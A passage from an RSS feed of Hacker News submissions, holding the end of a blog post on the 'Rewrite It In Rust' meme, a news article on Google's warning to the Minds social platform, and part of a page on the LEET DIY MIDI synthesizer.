I haven't checked the exact timelines, but since this is a language flame war, I'm sure somebody will leap in to do that research for me.</p>
<p><img src="http://transitiontech.ca/assets/riir/nix-dev-perl-to-rust.jpg" alt="" title="Rust does this very well, to the point where me enumerating its benefits would be redundant."></p>
<h3 id="tor">Tor</h3>
<p>Yup, Tor, the very large, critical infrastructure that keeps journalists, criminals, schizophrenics, and <del>piracy</del> privacy activists anonymous has been <a href="https://trac.torproject.org/projects/tor/ticket/11331">asked to rewrite their software</a>.</p>
<p><img src="http://transitiontech.ca/assets/riir/rewrite-tor-in-rust.jpg" alt="" title="Writing C code that is safe is super hard (even for exeperienced Tor devs)"></p>
<h2 id="more-still">More still...</h2>
<p>Why not <a href="https://www.quora.com/Would-it-be-possible-advantageous-to-rewrite-the-Linux-kernel-in-Rust-when-the-language-is-stable" title="this one isn't on an issue tracker, at least">rewrite the Linux Kernel</a>? I'd love to hear Linus's answer to this.</p>
<p>Then of course there's <a href="https://news.ycombinator.com/item?id=11337399">this comprehensive thread</a> on Hacker News covering a bunch of angles on the pros and cons of this meme.</p>
<p>Finally, I stumbled across <a href="http://robert.ocallahan.org/2016/02/rewrite-everything-in-rust.html" title="rewrite everytihng in rust">this blog</a>.</p>
<p>Despite being quite new, and certainly newer than the meme itself, this post seems to exemplify many of the talking points extolled by proponents of <strong>RIIR</strong>.</p>
<p>Its title even comes in the form of a call to action:</p>
<blockquote>
<p>Rewrite Everything In Rust</p>
</blockquote>
<h2 id="so">So...?</h2>
<p>I don't really have more to say on the matter.
I just wrote this much to document a phenomenon I've noticed.</p>
<p>I don't have a comments section, because it ends up being really time consuming to say annoying, opinionated things if you have to answer for the fallout in your comments section.
Instead, I made <a href="https://github.com/ansuz/RIIR" title="Rewrite It In Rust">a github repo</a> where you can <a href="https://github.com/ansuz/RIIR/issues">file an issue</a> which:</p>
<ol>
<li>voices your own obnoxious opinion</li>
<li>supports my thesis<ul>
<li>super bonus points if you find more github issues asking for Rust rewrites</li>
</ul>
</li>
<li>refutes my thesis<ul>
<li>super science points if you find that this behaviour is not exhibited disproportionately by Rust users</li>
</ul>
</li>
<li>links to some project where somebody actually did <em>Rewrite It In Rust</em></li>
</ol>
<h2 id="did-this-post-offend-you">Did this post offend you?</h2>
<p>Cool.</p>
<p>Talk about it.</p>
<p>Tell your friends.</p>
<p>Good memes die hard.</p>
<p>--ansuz</p>
<p><strong>2016-03-22</strong></p>
 </div>
    </div>
</div></div>]]>
            </description>
            <link>http://transitiontech.ca/random/RIIR</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807127</guid>
            <pubDate>Sun, 17 Jan 2021 01:10:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google sends ‚Äò24 hour warning‚Äô to free-speech ‚Äòanti-Facebook‚Äô platform, Minds]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25806746">thread link</a>) | @drummer
<br/>
January 16, 2021 | https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/ | <a href="https://web.archive.org/web/*/https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p><strong>The social media platform Minds had to remove ‚Äòmajor functionality‚Äô from its Android app after getting a chilling warning from Google. Its co-founder said plans for a censorship-resistant infrastructure are in the works.</strong></p>
<p>In a&nbsp;<a href="https://www.minds.com/newsfeed/1196949029506060288" rel="noreferrer noopener" target="_blank">post</a>&nbsp;on Friday evening, Bill Ottman said that Minds had received a&nbsp;<em>‚Äú24 hour warning‚Äù</em>&nbsp;from the Google Play store. This forced them to submit an updated version of the app, based on&nbsp;<em>‚Äúinterim solution and ninja developers,‚Äù</em> which removed the search, discovery and comments functionality.</p>
<p><em>‚ÄúI know. We aren‚Äôt happy and will be working towards something better,‚Äù</em>&nbsp;Ottman said.&nbsp;<em>‚ÄúWhat is happening on the internet with major providers is fueling the cultural divide as much as anything,‚Äù</em>&nbsp;he added.</p>
<p>Operating since 2015, Minds was conceived as a blockchain-based community-owned social media platform that would not monetize user data but enable free speech instead.&nbsp;<a href="https://www.wired.com/story/minds-anti-facebook/" rel="noreferrer noopener" target="_blank">Wired</a>&nbsp;magazine once described it as the&nbsp;<em>‚Äúanti-Facebook.‚Äù</em></p>
<p><em>Owen is joined by James O‚ÄôKeefe of Project Veritas, after the explosive video released of Twitter CEO Jack Dorsey who revealed his true intentions on social media.</em></p>
<p>Ottman advised users to download the app from Minds directly if possible.&nbsp;<em>‚ÄúIf you are on Apple, leave if you‚Äôre smart,‚Äù</em>&nbsp;he said.</p>


<p>As for going forward, he said a plan for&nbsp;<em>‚Äúfully censorship-resistant infrastructure‚Äù</em>&nbsp;is coming soon, and that Minds has&nbsp;<em>‚Äúmultiple escape pods ready to go‚Äù</em>&nbsp;if Amazon moves against them.</p>
<p>Ottman‚Äôs comments were a clear reference to what happened to Parler. The free-speech social media platform attracted tens of thousands of users purged from Twitter in the wake of the January 6 unrest at the US Capitol ‚Äì only to be banned from Google and Apple stores, and then taken down from the internet entirely after Amazon Web Services (AWS) denied them access to the cloud. Parler‚Äôs executives later revealed that other vendors rushed to jump ship as well, leaving them unable to operate entirely.</p>
<p>Those who complained about the rising tide of censorship have typically been told that the First Amendment to the US Constitution did not apply to private companies and that people should&nbsp;<em>‚Äúbuild their own‚Äù</em>&nbsp;platforms if they disagreed. Parler‚Äôs shutdown has shown that this is near-impossible when the major players control the internet infrastructure itself, however.</p>
<p>Mainstream media and tech platforms have gone after Parler, Gab, Minds, and Telegram for allegedly having&nbsp;<em>‚Äúfar-right‚Äù</em>users and allowing&nbsp;<em>‚Äúhate speech‚Äù</em>&nbsp;as content. In Parler‚Äôs case, Amazon‚Äôs ultimatum demanded moderation policies they would approve of in order to avoid removal from AWS.</p>
<p>In a lawsuit accusing Amazon of breach of contract, antitrust violations and defamation, Parler argued that this was pretextual and revealed that Amazon staff sought to find out if US President Donald Trump ‚Äì freshly banned from Twitter and locked out of Facebook ‚Äì had set up an account on the platform.</p>
    
    		</div></div>]]>
            </description>
            <link>https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806746</guid>
            <pubDate>Sun, 17 Jan 2021 00:03:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Leet Synthesizer by Johan von Konow]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25806661">thread link</a>) | @Gravityloss
<br/>
January 16, 2021 | https://vonkonow.com/wordpress/leet-synthesizer/ | <a href="https://web.archive.org/web/*/https://vonkonow.com/wordpress/leet-synthesizer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1381">
		<!-- .entry-header -->

	
<div>

<figure><amp-img width="740" height="251" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=740%2C251&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=1024%2C348&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=300%2C102&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=768%2C261&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=1536%2C522&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=2048%2C696&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="251" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=740%2C251&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=1024%2C348&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=300%2C102&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=768%2C261&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=1536%2C522&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?resize=2048%2C696&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/leet_logo.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1MScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></figure>



<p>LEET is my vision of a new kind of modular affordable synth you can build yourself. It consists of several MIDI devices that can be used together or separate with your preferred DAW. </p>



<figure><div>
<amp-youtube data-videoid="ABjKIWZwcgA" layout="responsive" width="740" height="416" title="leet teaser" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://www.youtube.com/watch?v=ABjKIWZwcgA&amp;feature=youtu.be&amp;ab_channel=JohanvonKonow"><amp-img src="https://i0.wp.com/i.ytimg.com/vi/ABjKIWZwcgA/hqdefault.jpg?w=740&amp;ssl=1" layout="fill" object-fit="cover" alt="leet teaser" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div><figcaption>A 42 sec video to demonstrate its capabilities (I think it is awesome, but then again ‚Äì I‚Äôm slightly biased ;)</figcaption></figure>



<p>It became a massive project covering industrial design, embedded programming, 3D modelling, electronics and music theory. I‚Äôm happy with the current state, but I hope that with the help of others, the project will continue to evolve and improve.</p>



<figure><amp-img width="740" height="363" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b.jpg?resize=740%2C363&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=1024%2C502&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=300%2C147&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=768%2C376&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=1536%2C752&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=2048%2C1003&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="363" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b.jpg?resize=740%2C363&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=1024%2C502&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=300%2C147&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=768%2C376&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=1536%2C752&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?resize=2048%2C1003&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth5b-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2Mycgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Rendering of sequencer with micro SD card) and three single octave keyboards.</figcaption></figure>



<p>I have designed a <a href="https://vonkonow.com/wordpress/leet-keyboard/">keyboard</a>, <a href="https://vonkonow.com/wordpress/leet-pad/">drum pad</a>, <a href="https://vonkonow.com/wordpress/leet-chord/">chord keyboard</a>, <a href="https://vonkonow.com/wordpress/leet-control/">control unit</a>,  <a href="https://vonkonow.com/wordpress/leet-arpeggiator/">arpeggiator</a> and a <a href="https://vonkonow.com/wordpress/leet-sequencer/">step sequencer</a>. One special feature is that the units have RGB LEDs for each key, enabling playback visualization (so each device is both MIDI out and in). This is helpful for music training and editing, but it also looks great. They can be used as input devices to any computer with a DAW (Digital Audio Workstation) like Ableton, Logic, Cubase, Garageband etc. It will run on Windows, Mac or Linux (including Raspberry Pi). They can even be connected to your mobile phone (Android or iOS), providing a tactile super portable music development platform.</p>



<figure><div>
<amp-youtube data-videoid="4Jrv6JmE3lc" layout="responsive" width="740" height="416" title="LEET mobile" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://youtu.be/4Jrv6JmE3lc"><amp-img src="https://i2.wp.com/i.ytimg.com/vi/4Jrv6JmE3lc/hqdefault.jpg?w=740&amp;ssl=1" layout="fill" object-fit="cover" alt="LEET mobile" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div><figcaption>LEET + Mobile phone = Synthesizer</figcaption></figure>



<figure><amp-img width="740" height="350" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark.jpg?resize=740%2C350&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=1024%2C485&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=300%2C142&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=768%2C363&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=1536%2C727&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=2048%2C969&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="350" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark.jpg?resize=740%2C350&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=1024%2C485&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=300%2C142&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=768%2C363&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=1536%2C727&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?resize=2048%2C969&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/mobile_dark-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM1MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Mobile setup with a keyboard connected directly to an Android phone running Caustic 3</figcaption></figure>



<figure><div>
<amp-youtube data-videoid="RMyfaAVU64k" layout="responsive" width="740" height="416" title="LEET Linux" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://youtu.be/RMyfaAVU64k"><amp-img src="https://i1.wp.com/i.ytimg.com/vi/RMyfaAVU64k/hqdefault.jpg?w=740&amp;ssl=1" layout="fill" object-fit="cover" alt="LEET Linux" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div><figcaption><em>Demonstration of high-quality sound generation with LEET Linux running FluidSynth with Yamaha Disklavier Pro Grand Piano soundfont.</em></figcaption></figure>







<h2>Build your own synth</h2>



<figure><amp-img src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=674%2C333&amp;ssl=1" alt="" width="674" height="333" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=1024%2C506&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=300%2C148&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=768%2C380&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=1536%2C760&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=2048%2C1013&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 674px) 100vw, 674px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=674%2C333&amp;ssl=1" alt="" width="674" height="333" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=1024%2C506&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=300%2C148&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=768%2C380&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=1536%2C760&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?resize=2048%2C1013&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/front_cyan.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 674px) 100vw, 674px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMzMycgd2lkdGg9JzY3NCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Print and solder the units you want. It‚Äôs like building a plastic model (that you can actually play with)</figcaption></figure>



<p>The devices are easy to build and anyone with a 3D printer and basic soldering skills should be able to replicate them. They are designed to use few components that are easily accessible and affordable (one keyboard cost around $6). </p>



<h2>Hacking is encouraged</h2>



<figure><amp-img width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/hack-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Tweak the open source hardware or software anyway you like.</figcaption></figure>



<p>Everything is open source and built with the easy to use Arduino framework so it can be tweaked, improved and complemented with new functions to fit all kinds of different needs. Build a wooden stand, add a light sensor to control timbre, connect it to a speak and spell or build something completely new ‚Äì the possibilities are endless!</p>



<figure><amp-img width="740" height="370" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1.jpg?resize=740%2C370&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=2048%2C1024&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="370" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1.jpg?resize=740%2C370&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?resize=2048%2C1024&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/code2-1-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM3MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption><em>Sourcecode written in the free to use Arduino </em>IDE.</figcaption></figure>



<h2>3D Printed Circuit Board</h2>



<figure><amp-img width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?w=1480&amp;ssl=1 1480w, 